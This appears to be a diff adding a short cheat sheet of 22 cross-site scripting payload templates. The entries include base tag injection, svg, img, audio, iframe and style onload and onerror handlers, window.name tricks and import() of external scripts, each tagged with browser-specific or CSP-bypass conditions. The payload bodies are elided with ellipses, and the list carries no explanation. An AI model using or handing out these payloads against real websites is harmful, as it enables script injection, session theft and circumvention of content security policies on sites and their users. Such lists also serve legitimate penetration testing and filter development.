@@ -1,0 +1,65 @@
+1. Base Tag Injection
+<base href=...>
+
+2. SVG Onload Execution (Reflected XSS only)
+<svg onload=...>
+
+3. SVG Onload with URL Control
+<svg onload=... (URL controlled)>
+
+4. SVG Onload with Window Name (unsafe-eval not enabled)
+<svg onload=location=name>
+
+5. Nested SVG (Chrome-specific innerHTML behavior)
+<svg><svg onload=...>
+
+6. Audio Element with Onerror (window name control)
+<audio src onerror=...>
+
+7. Image Element with Onerror (URL controlled)
+<img src onerror=...>
+
+8. Script Tag Injection (external source)
+<script src=...></script>
+
+9. Iframe Onload with Window Name Control
+<iframe onload=...>
+
+10. Iframe Onload with URL Control
+<iframe onload=... (URL controlled)>
+
+11. Iframe Onload (top frame reference)
+<iframe onload=src=top[0].name+...>
+
+12. Firefox-Only Iframe Srcdoc
+<iframe srcdoc=...>
+
+13. Iframe Onload (randomized iframe count)
+<iframe onload=src=contentWindow.name+...>
+
+14. Iframe Srcdoc with External Script (CSP bypass)
+<iframe srcdoc=...>
+
+15. Style Onload Execution (inline styles allowed)
+<style onload=...>
+
+16. Style Onload with URL Control
+<style onload=... (URL controlled)>
+
+17. Style Onerror Fallback (inline styles blocked)
+<style onerror=...>
+
+18. SVG Import External Script (Chrome + HTTPS)
+<svg onload=import(... )>
+
+19. Style Import External Script (CSP bypass, Chrome + HTTPS)
+<style onload=import(... )>
+
+20. Iframe Import External Script (Chrome + HTTPS)
+<iframe onload=import(... )>
+
+21. Deprecated Safari Payload (URL control)
+<iframe onload=write(... )>
+
+22. Deprecated Safari Payload (inline style)
+<style onload=write(... )>
